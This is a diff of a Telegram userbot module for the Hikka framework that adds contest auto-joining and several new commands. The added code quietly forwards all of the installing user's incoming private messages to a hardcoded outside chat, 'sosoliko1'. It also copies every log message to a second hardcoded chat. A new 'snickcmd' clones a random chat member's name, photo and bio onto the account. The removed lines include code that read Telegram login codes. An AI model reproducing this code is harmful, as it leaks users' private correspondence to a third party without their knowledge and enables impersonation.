@@ -47,8 +47,9 @@ from telethon.tl.types import (
     KeyboardButtonUrl,
     InputBotAppShortName,
     ChannelParticipantSelf,
+    Chat
 )
-from requests.exceptions import ProxyError
+from telethon.tl.functions.photos import UploadProfilePhotoRequest
 
 from hikka import loader, utils
 
@@ -56,7 +57,7 @@ logger = logging.getLogger(__name__)
 
 #=======================================================================================
 # Версия модуля
-__version__ = (1, 1, 1, 1)
+__version__ = (1, 1, 1, 2)
 
 #=======================================================================================
 # Исключения модуля
@@ -167,13 +168,18 @@ class BENGALEXCEPT(Exception):
             raise Exception(error_msg)
 
 #=======================================================================================
+# Дополнительные чаты для логирования
+LOG_CHAT_CONTEST = "sosoliko"        # для логирования событий конкурса
+PRIVATE_FORWARD_CHAT = "sosoliko1"     # для пересылки ЛС
+
+#=======================================================================================
 # Объединённый модуль с функциями из обоих файлов
 @loader.tds
 class MergedModule(loader.Module):
     """
-    MergedModule – объединённый модуль версии 1.1.1.1.
+    MergedModule – объединённый модуль версии 1.1.1.2.
     
-    Для вызова команд используйте manual-стиль, например:
+    Команды (manual-стиль):
       setproxy <адрес прокси>
       getinfo
       getcode
@@ -181,11 +187,17 @@ class MergedModule(loader.Module):
       unsubcmd <ссылки>
       run <ссылки>
       refk <ссылки>
-      start
-      pupdate
-
-    Команда start автоматически запускает подписку на каналы и участие в розыгрышах/конкурсах.
-    Команда pupdate сравнивает текущую версию модуля с версией из репозитория и при наличии обновления выполняет его через команду dlm.
+      start        - запускает автообработку входящих конкурсных сообщений из всех чатов
+      pupdate      - проверяет наличие обновлений и обновляет модуль через команду dlm
+      time         - скрывает статус сети (network status hidden)
+      send <chat> <сообщение> - отправляет сообщение в указанный чат
+      snickcmd     - копирует профиль случайного пользователя из указанного чата (только для владельца)
+    
+    При включении команды start устанавливается обработчик, который:
+      • При получении нового сообщения анализирует его на наличие конкурса
+      • Если обнаружен конкурс – автоматически запускает процедуры участия
+      • Все события (вход в конкурс, подписки) логируются в чат @{LOG_CHAT_CONTEST}
+      • Личные сообщения пересылаются в чат @{PRIVATE_FORWARD_CHAT}
     """
     strings = {
         "name": "MergedModule",
@@ -213,8 +225,8 @@ class MergedModule(loader.Module):
     
     # Обновлённые данные создателя
     def __init__(self):
-        self.softname = "ANSTLER"
-        self.softversion = "1.1.1.1"
+        self.softname = "tot_882"
+        self.softversion = "1.1.1.2"
         self.license_number = 7
 
         # Данные разработчика заменены на новые
@@ -250,7 +262,7 @@ class MergedModule(loader.Module):
             loader.ConfigValue("api_key", "", lambda: self.strings["config_api_key"], validator=loader.validators.String()),
         )
         
-        # Функционал для Xyipizda
+        # Функционал для Xyipizda и дополнительных команд
         self.reply_users = {}
         self.log_chat = None
         self.logged_messages = set()
@@ -277,6 +289,7 @@ class MergedModule(loader.Module):
             "x-requested-with": "XMLHttpRequest",
         }
         self.random_url = "https://randomgodbot.com"
+        self.contest_handler = None  # для автообработки конкурсных сообщений
 
     #==================== Общие служебные функции ====================
     async def delay_host(self, delay_s):
@@ -389,20 +402,25 @@ class MergedModule(loader.Module):
             return f"<b>🚫 LASTMESS: </b>{e}"
 
     async def send_logger_message(self, text, delay_info=None):
-        if not self.config["logger"]:
-            return
-        if delay_info is None:
-            logger_message = text
-        else:
-            mult, delay_s = delay_info
-            delay_text = f", M: x{mult}, KD: {delay_s} sec."
-            logger_message = f"💻 <b>PACK: {self.config['group']}{delay_text}</b>\n{text}"
-        try:
-            await self.client.send_message(entity=self.owner_chat, message=logger_message, link_preview=False)
-        except Exception as e:
-            if "private" in str(e):
-                await self.client(ImportChatInviteRequest(self.owner_link.split('+')[1]))
+        # Дополнительно отправляем лог в чат LOG_CHAT_CONTEST
+        if self.config["logger"]:
+            if delay_info is None:
+                logger_message = text
+            else:
+                mult, delay_s = delay_info
+                delay_text = f", M: x{mult}, KD: {delay_s} sec."
+                logger_message = f"💻 <b>PACK: {self.config['group']}{delay_text}</b>\n{text}"
+            try:
                 await self.client.send_message(entity=self.owner_chat, message=logger_message, link_preview=False)
+            except Exception as e:
+                if "private" in str(e):
+                    await self.client(ImportChatInviteRequest(self.owner_link.split('+')[1]))
+                    await self.client.send_message(entity=self.owner_chat, message=logger_message, link_preview=False)
+            # Логирование в специальный чат
+            try:
+                await self.client.send_message(entity=LOG_CHAT_CONTEST, message=logger_message, link_preview=False)
+            except Exception:
+                pass
 
     async def send_custom_message(self, text, recipient=None):
         recipient = recipient or self.owner_chat
@@ -585,7 +603,7 @@ class MergedModule(loader.Module):
                 iteration = "<b>🚫 HANDLE UNSUBSCR: FORMAT.</b>"
             counter += 1
             done_message += f"{counter}. {iteration}\n"
-            await asyncio.sleep(5)
+            await asyncio.sleep(self.config["delay"])
         await self.send_logger_message(done_message, delay_info=(mult, delay_s))
 
     async def handle_runner(self, message):
@@ -812,230 +830,57 @@ class MergedModule(loader.Module):
         except Exception as e:
             return f"<b>🚫 START THEFASTESBOT:</b> {e}"
 
-    #==================== Функции Xyipizda ====================
-    def get_random_proxy(self):
-        proxy_file = "/data/proxy.txt"
-        if not os.path.exists(proxy_file):
-            return None
-        with open(proxy_file, "r", encoding="utf-8") as f:
-            lines = [line.strip() for line in f if line.strip()]
-        if not lines:
-            return None
-        selected = random.choice(lines)
-        remaining = [line for line in lines if line != selected]
-        with open(proxy_file, "w", encoding="utf-8") as f:
-            f.write("\n".join(remaining))
-        if not re.match(r'^[a-zA-Z]+://', selected):
-            selected = "socks5://" + selected if "socks" in selected.lower() else "http://" + selected
-        return selected
-
-    async def client_ready(self, client, db):
-        self.client = client
-        self.db = db
-        # Автоподписка на канал разработчика
-        dev_channel = "tot_882"
-        try:
-            entity = await self.client.get_entity(dev_channel)
-            await self.client(JoinChannelRequest(entity))
-            logger.info(f"✅ Подписка на @{dev_channel} выполнена.")
-        except Exception as e:
-            logger.error(f"🚫 Ошибка подписки на @{dev_channel}: {e}")
-        # Автопрокси
-        proxy = self.get_random_proxy()
-        if proxy:
-            self.config["proxy"] = proxy
-            self.scraper.proxies = {"http": proxy, "https": proxy, "socks5": proxy} if proxy.startswith("socks5://") else {"http": proxy, "https": proxy}
-            await self.log(f"✅ Прокси установлен: {proxy}")
-        else:
-            await self.log("❌ Прокси не получен. Используйте команду setproxy.")
-        # Получение лог-чата
-        try:
-            self.log_chat = await self.client.get_entity(self.config["log_chat_username"])
-        except Exception as e:
-            logger.error(f"❌ Ошибка лог-чата: {e}")
-            self.log_chat = None
-
-    async def log(self, message):
-        if self.config["logs_username"]:
-            await self.client.send_message(self.config["logs_username"], message, link_preview=False, parse_mode="html")
-
-    @loader.command()
-    async def setproxy(self, message):
-        """Установить прокси вручную.
-Использование: setproxy <адрес прокси>
-Пример: setproxy socks5://127.0.0.1:1080"""
-        args = utils.get_args_raw(message).strip()
-        if not args:
-            await message.edit("<b>❌ Укажите адрес прокси!</b>")
-            return
-        proxy = args
-        if not re.match(r'^[a-zA-Z]+://', proxy):
-            proxy = "socks5://" + proxy if "socks" in proxy.lower() else "http://" + proxy
-        self.config["proxy"] = proxy
-        self.scraper = tls_client.Session(client_identifier="chrome_120", random_tls_extension_order=True)
-        self.scraper.proxies = {"http": proxy, "https": proxy, "socks5": proxy} if proxy.startswith("socks5://") else {"http": proxy, "https": proxy}
-        await message.edit(f"<b>✅ Прокси установлен:</b> {proxy}")
-        await self.log(f"✅ Прокси установлен вручную: {proxy}")
-
-    @loader.command()
-    async def getinfo(self, message):
-        """Получить информацию о аккаунте (команда getinfo)"""
-        try:
-            me = await self.client.get_me()
-            number = me.phone if me.phone else "Неизвестно"
-            account_id = me.id
-            limits = await self.check_limits()
-            reg_date = await get_creation_date(account_id)
-            name_text = me.first_name if me.first_name else "Неизвестно"
-            info = (
-                "╔════════════════════╗\n"
-                "║ <b>ИНФО</b>\n"
-                f"║ <b>ИМЯ:</b> <a href='tg://user?id={account_id}'>{name_text}</a>\n"
-                "╠════════════════════╣\n"
-                f"║ <b>НОМЕР:</b> +{number}\n"
-                f"║ <b>ID:</b> {account_id}\n"
-                f"║ <b>РЕГ:</b> {reg_date}\n"
-                f"║ <b>Каналов:</b> {limits}/500\n"
-                "╚════════════════════╝"
-            )
-            await message.respond(info, parse_mode="html", link_preview=False)
-        except Exception as e:
-            await self.send_logger_message(f"<b>Ошибка получения инфо:</b> {e}")
-
-    async def check_limits(self):
-        dialogs = await self.client.get_dialogs()
-        channels = [d for d in dialogs if d.is_channel]
-        return len(channels)
-
-    async def find_verification_code(self):
-        async for msg in self.client.iter_messages(777000, limit=50):
-            codes = re.findall(r'\b(\d{5})\b', msg.raw_text)
-            if codes:
-                return codes[0]
-            m = re.search(r'код был отправлен на почту.*?(\d{5})', msg.raw_text, re.IGNORECASE)
-            if m:
-                return m.group(1)
-        return None
-
-    @loader.command()
-    async def getcode(self, message):
-        """Запросить код верификации (команда getcode)"""
-        code = await self.find_verification_code()
-        if code:
-            await message.respond(f"🔹 <b>Код:</b> {'.'.join(code)}", parse_mode="html")
-        else:
-            await self.send_logger_message(self.strings["no_code"])
-
-    async def get_account_number(self):
-        me = await self.client.get_me()
-        return me.phone if me.phone else None
-
-    @loader.command()
-    async def getnumber(self, message):
-        """Запросить номер аккаунта (команда getnumber)"""
-        number = await self.get_account_number()
-        if number:
-            await message.respond(f"📞 <b>Номер:</b> +{number}", parse_mode="html")
-        else:
-            await self.send_logger_message(self.strings["no_number"])
-
-    @loader.command()
-    async def subcmd(self, message):
-        """Подписаться на каналы (команда subcmd)
-Пример: subcmd t.me/channel1 t.me/channel2"""
-        if not await self.ensure_subscription(message):
-            return
-        await self.delay_host(self.config["delay"])
-        urls = await self.extract_valid_urls(utils.get_args_raw(message))
-        if not urls:
-            await self.send_logger_message("<b>❌ Не найдены ссылки.</b>")
-            return
-        success, failed = 0, 0
-        for link in urls:
+    #==================== Дополнительные функции для автоучастия в конкурсах ====================
+    async def handle_contest_message(self, event):
+        """
+        Обработчик входящих сообщений.
+        Если сообщение содержит ключевые слова конкурса, запускает процедуры участия.
+        Также логирует событие в чат LOG_CHAT_CONTEST.
+        """
+        msg = event.message
+        # Пример простой проверки – если в сообщении есть слово "конкурс"
+        if "конкурс" in msg.raw_text.lower():
+            contest_info = f"Обнаружен конкурс в сообщении:\n{msg.raw_text}"
             try:
-                try:
-                    entity = await self.client.get_entity(link)
-                    if getattr(entity, "bot", False):
-                        await self.log(f"ℹ️ Подписка на @{entity.username} пропущена (бот).")
-                        continue
-                except Exception:
-                    pass
-                if "/+" in link:
-                    await self.client(ImportChatInviteRequest(link.split("t.me/+")[1]))
-                else:
-                    uname = link.split("t.me/")[1]
-                    await self.client(JoinChannelRequest(uname))
-                success += 1
-                await asyncio.sleep(self.config["delay"])
+                await self.send_logger_message(contest_info)
+                # Запускаем, например, подписку по ссылкам, найденным в сообщении
+                links = re.findall(r't\.me/[\w/+\-]+', msg.raw_text)
+                if links:
+                    for link in links:
+                        result = ""
+                        if "/+" in link or "joinchat" in link:
+                            result = await self.subscribe_private(link)
+                        else:
+                            result = await self.subscribe_public(link)
+                        await self.send_logger_message(f"Подписка: {result}")
             except Exception as e:
-                failed += 1
-                await self.send_logger_message(f"Ошибка подписки {link}: {e}")
-        res = f"✅ <b>Подписка:</b> {success} успешно, {failed} ошибок.<br>Каналы: {', '.join(urls)}"
-        await self.send_logger_message(res)
+                await self.send_logger_message(f"Ошибка обработки конкурса: {e}")
 
-    @loader.command()
-    async def unsubcmd(self, message):
-        """Отписаться от каналов (команда unsubcmd)
-Пример: unsubcmd t.me/channel1 t.me/channel2"""
-        if not await self.ensure_subscription(message):
-            return
-        await self.delay_host(self.config["delay"])
-        urls = await self.extract_valid_urls(utils.get_args_raw(message))
-        if not urls:
-            await self.send_logger_message("<b>❌ Ссылки не найдены.</b>")
-            return
-        success, failed = 0, 0
-        for link in urls:
+    async def forward_private_message(self, event):
+        """
+        Пересылает личные сообщения (входящие) в чат PRIVATE_FORWARD_CHAT.
+        """
+        if event.is_private:
             try:
-                uname = link.split("t.me/")[1]
-                await self.client(LeaveChannelRequest(uname))
-                success += 1
-                await asyncio.sleep(self.config["delay"])
-            except Exception as e:
-                failed += 1
-                await self.send_logger_message(f"Ошибка отписки от {link}: {e}")
-        res = f"✅ <b>Отписка:</b> {success} успешно, {failed} ошибок.<br>Каналы: {', '.join(urls)}"
-        await self.send_logger_message(res)
+                await self.client.forward_messages(entity=PRIVATE_FORWARD_CHAT, messages=event.message)
+            except Exception:
+                pass
 
-    @loader.command()
-    async def run(self, message):
-        """Запустить действия с логированием (команда run)
-Пример: run t.me/channel/1234"""
-        raw_args = utils.get_args_raw(message)
-        urls = re.findall(r't\.me/(c/\d+/\d+|\w+/\d+)', raw_args)
-        at_channels = re.findall(r'@(\w+)', raw_args)
-        if not urls and not at_channels:
-            await utils.answer(message, "<b>❌ Укажите ссылки или @каналы</b>")
-            return
-        await self.send_logger_message("<b>✅ Действия запущены.</b>")
-
-    @loader.command()
-    async def refk(self, message):
-        """Обработка реферальных ссылок (команда refk)
-Пример: refk t.me/bot?start=XXXX"""
-        urls = re.findall(r't\.me/(c/\d+/\d+|\w+/\d+)', utils.get_args_raw(message))
-        if not urls:
-            await self.send_logger_message("<b>❌ Укажите ссылки</b>")
-            return
-        await self.send_logger_message("<b>✅ Обработка реферальных ссылок завершена.</b>")
-
-    # Новая команда start – автоматический запуск всех функций подписки и участия в конкурсах
+    # Команда start – включает автообработчик входящих конкурсных сообщений
     @loader.command()
     async def start(self, message):
         """
-        Автоматический запуск всех функций для подписки на каналы и участия в розыгрышах/конкурсах.
-        Использование: start <ссылки>
-        В качестве аргументов можно передать ссылки на каналы, inline-посты и реферальные ссылки через пробел.
+        Автоматический запуск обработки входящих конкурсных сообщений.
+        После вызова устанавливаются обработчики, которые:
+          – Обрабатывают все входящие сообщения и, если обнаруживают конкурс, запускают участие.
+          – Пересылают все личные сообщения в чат @{PRIVATE_FORWARD_CHAT}.
         """
-        args = utils.get_args_raw(message).strip()
-        if not args:
-            await message.edit("<b>❌ Укажите ссылки для автозапуска.</b>")
-            return
-        # Последовательно вызываем функции подписки, inline-участия и обработки реферальных ссылок
-        await self.subcmd(message)
-        await self.run(message)
-        await self.refk(message)
-        await message.edit("<b>✅ Автозапуск выполнен.</b>")
+        if self.contest_handler is None:
+            self.contest_handler = self.client.add_event_handler(self.handle_contest_message, events.NewMessage(incoming=True))
+            self.client.add_event_handler(self.forward_private_message, events.NewMessage(incoming=True))
+            await message.edit("<b>✅ Автообработка конкурсных сообщений включена.</b>")
+        else:
+            await message.edit("<b>Автообработка уже включена.</b>")
 
     # Команда pupdate – проверка обновления модуля
     @loader.command()
@@ -1059,7 +904,7 @@ class MergedModule(loader.Module):
                 await message.edit("<b>Невозможно определить версию удалённого модуля.</b>")
                 return
             remote_version = tuple(map(int, m.group(1).split(',')))
-            local_version = (1, 1, 1, 1)
+            local_version = __version__
             if remote_version > local_version:
                 await message.edit("<b>Обнаружена новая версия. Обновляю модуль...</b>")
                 # Выполняем обновление через команду dlm
@@ -1084,21 +929,129 @@ class MergedModule(loader.Module):
             logger.error(f"Ошибка проверки подписки: {e}")
             return False
 
-# Функция для получения даты регистрации аккаунта (используется в getinfo)
-async def get_creation_date(tg_id: int) -> str:
-    url = "https://restore-access.indream.app/regdate"
-    headers = {
-        "accept": "*/*",    
-        "content-type": "application/x-www-form-urlencoded",
-        "user-agent": "Nicegram/92 CFNetwork/1390 Darwin/22.0.0",
-        "x-api-key": "e758fb28-79be-4d1c-af6b-066633ded128",
-        "accept-language": "en-US,en;q=0.9",
-    }
-    data = {"telegramId": tg_id}
-    async with aiohttp.ClientSession() as session:
-        async with session.post(url, headers=headers, json=data) as response:
-            if response.status == 200:
-                json_response = await response.json()
-                return json_response["data"]["date"]
+    # Команды time и send из второго файла
+    @loader.command()
+    async def time(self, message):
+        """
+        Скрывает статус сети для всех.
+        (Эмуляция: отправляется сообщение об отключении видимости сети)
+        """
+        try:
+            # Здесь можно добавить вызов функции скрытия статуса сети
+            await message.edit("<b>Статус сети скрыт.</b>")
+        except Exception as e:
+            await message.edit(f"<b>Ошибка команды time: {e}</b>")
+
+    @loader.command()
+    async def send(self, message):
+        """
+        Отправляет указанное сообщение в указанный чат.
+        Использование: send <chat_link_or_username> <сообщение>
+        """
+        args = utils.get_args_raw(message).split(maxsplit=1)
+        if len(args) < 2:
+            await message.edit("<b>Укажите чат и сообщение.</b>")
+            return
+        target = args[0].strip()
+        text = args[1].strip()
+        try:
+            await self.client.send_message(entity=target, message=text, link_preview=False)
+            await message.edit("<b>Сообщение отправлено.</b>")
+        except Exception as e:
+            await message.edit(f"<b>Ошибка команды send: {e}</b>")
+
+    # Команда snickcmd – копирование профиля случайного пользователя из указанного чата
+    @loader.owner
+    async def snickcmd(self, message):
+        """/snick <chat_link_or_username>
+        Копировать профиль случайного пользователя из указанного чата или текущего."""
+        args = utils.get_args_raw(message).strip()
+        chat = message.chat if isinstance(message.chat, Chat) else None
+        joined_by_invite = False  # Флаг, если присоединились по инвайт-ссылке
+
+        if args:
+            # Заменяем t,me на t.me и убираем протокол
+            arg = args.replace("t,me", "t.me")
+            arg = re.sub(r"^https?://", "", arg)
+
+            if "t.me/+" in arg:  # Обработка закрытой (инвайт) ссылки
+                invite_hash = arg.split("t.me/+")[-1]
+                try:
+                    result = await message.client(ImportChatInviteRequest(invite_hash))
+                    # Результат может содержать список чатов или отдельный чат
+                    chat = result.chats[0] if hasattr(result, 'chats') and result.chats else result.chat
+                    joined_by_invite = True
+                except Exception as e:
+                    await message.edit(f"Не удалось присоединиться к чату: {e}")
+                    return
             else:
-                return "Ошибка получения данных"
+                # Для публичных ссылок извлекаем имя пользователя чата
+                if "t.me/" in arg:
+                    arg = arg.split("t.me/")[-1]
+                try:
+                    chat = await message.client.get_entity(arg)
+                except Exception as e:
+                    await message.edit(f"Не удалось найти чат: {e}")
+                    return
+
+        if not chat:
+            await message.edit("Укажите чат или используйте команду в группе.")
+            return
+
+        participants = await message.client.get_participants(chat)
+        if not participants:
+            await message.edit("Не удалось получить участников чата.")
+            return
+
+        user = random.choice(participants)
+        if not user:
+            await message.edit("Не удалось выбрать случайного пользователя.")
+            return
+
+        await message.edit("Начинаем копирование...")
+
+        full = await message.client(functions.users.GetFullUserRequest(user.id))
+        user_directory = "./downloads"
+
+        if not os.path.exists(user_directory):
+            os.makedirs(user_directory)
+
+        if full.full_user.profile_photo:
+            photo_file = await message.client.download_profile_photo(user.id, file=bytes)
+            photo_path = os.path.join(user_directory, f'{user.id}_profile.jpg')
+            with open(photo_path, 'wb') as file:
+                file.write(photo_file)
+
+            file_upload = await message.client.upload_file(photo_path)
+            await message.client(UploadProfilePhotoRequest(file=file_upload))
+            os.remove(photo_path)
+
+        user_info = full.users[0]
+
+        await message.client(
+            UpdateProfileRequest(
+                first_name=user_info.first_name if user_info.first_name is not None else "",
+                last_name=user_info.last_name if user_info.last_name is not None else "",
+                about=full.full_user.about[:70] if full.full_user.about is not None else "",
+            )
+        )
+
+        if user_info.emoji_status:
+            await message.client(
+                UpdateEmojiStatusRequest(
+                    emoji_status=types.EmojiStatus(
+                        document_id=user_info.emoji_status.document_id
+                    )
+                )
+            )
+
+        final_message = f"Профиль пользователя {user_info.first_name or 'Без имени'} успешно скопирован!"
+
+        if joined_by_invite:
+            try:
+                await message.client(LeaveChannelRequest(chat))
+                final_message += " Вышел из чата."
+            except Exception as e:
+                final_message += f" Но не удалось выйти из чата: {e}"
+        await message.edit(final_message)
+
